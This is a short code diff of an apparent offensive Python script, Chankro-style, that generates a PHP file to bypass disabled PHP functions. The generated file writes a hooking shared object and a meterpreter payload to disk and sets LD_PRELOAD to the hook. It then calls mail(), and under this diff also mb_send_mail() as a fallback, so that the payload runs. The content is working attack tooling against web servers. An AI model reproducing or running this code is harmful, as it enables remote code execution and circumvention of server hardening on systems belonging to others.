@@ -69,13 +69,14 @@ body2 = "file_put_contents('" + args.pati + "/chankro.so', base64_decode($hook))
 body3 = "file_put_contents('" + args.pati + "/acpid.socket', base64_decode($meterpreter));\n"
 cosa3 = "putenv('CHANKRO=" + args.pati + "/acpid.socket');\n"
 tail1 = "putenv('LD_PRELOAD=" + args.pati + "/chankro.so');\n"
-tail2 = "mail('a','a','a','a');?>"
+tail2 = "$m_res = mail('a','a','a','a');"
+tail3 = "if(!$m_res) { mb_send_mail('a','a','a','a'); }?>"
 
 print "[+] Binary file: " + args.meter
 print "[+] Architecture: x" + args.arch
 print "[+] Final PHP: " + args.out + "\n\n"
 
 
-outfile.write(head + body1 + body2 + body3 + cosa3 + tail1 + tail2)
+outfile.write(head + body1 + body2 + body3 + cosa3 + tail1 + tail2 + tail3)
 outfile.close()
 print "[+] File created!"
